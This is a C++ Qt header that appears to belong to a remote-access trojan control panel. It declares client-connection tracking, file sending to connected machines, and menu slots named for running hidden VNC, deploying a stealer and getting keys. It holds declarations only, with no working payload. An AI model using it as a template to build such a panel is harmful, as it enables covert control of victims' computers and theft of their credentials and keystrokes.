#ifndef MAINWINDOW_H
#define MAINWINDOW_H
#include "winsock2.h"
#include "windows.h"
#include <QMainWindow>
#include <QThread>
#include <QMenu>
#include <QAction>
#include <QFileDialog>

QT_BEGIN_NAMESPACE
namespace Ui { class MainWindow; class NetStatus; class NetConnect; }
QT_END_NAMESPACE

class ReqStatus : public QObject
{
    Q_OBJECT

public:
    explicit ReqStatus(QObject *parent = nullptr);
    void GetStatusReq(int id, char* status);
    void ThreadSendFile(SOCKET CON, int row, char *fileName);

public slots:
    void scanReq();

};

class NetStatus : public QObject
{
    Q_OBJECT

public:
    explicit NetStatus(QObject *parent = nullptr);
    BOOL recvStat(SOCKET Con);

signals:
    void signalDelClient(int count);

public slots:
    void scanStat();

};

class NetConnect : public QObject
{
    Q_OBJECT

    public:
        explicit NetConnect(QObject *parent = nullptr);

    public slots:
        void recvConn();

    signals:
        void signalNewClient(int count, char* ip, char* info);
};

class MainWindow : public QMainWindow
{
    Q_OBJECT

public:
    MainWindow(QWidget *parent = nullptr);
    ~MainWindow();

signals:
    void startStat();
    void startServer();
    void startReq();
    void startSendFile(SOCKET CON, int row, char *fileName);


private slots:
    void NewConn(int count, char* ip, char* info);
    void slotCustomMenuRequested(QPoint pos);
    void slotSendFile();
    void slotRunHvncFile();
    void slotStealerFile();
    void slotGetKeys();
    void DelConn(int i);

private:
//    NetStatus *netStat;
//    NetConnect *netConn;
//    ReqStatus *reqStat;
    Ui::MainWindow *ui;

};


#endif // MAINWINDOW_H
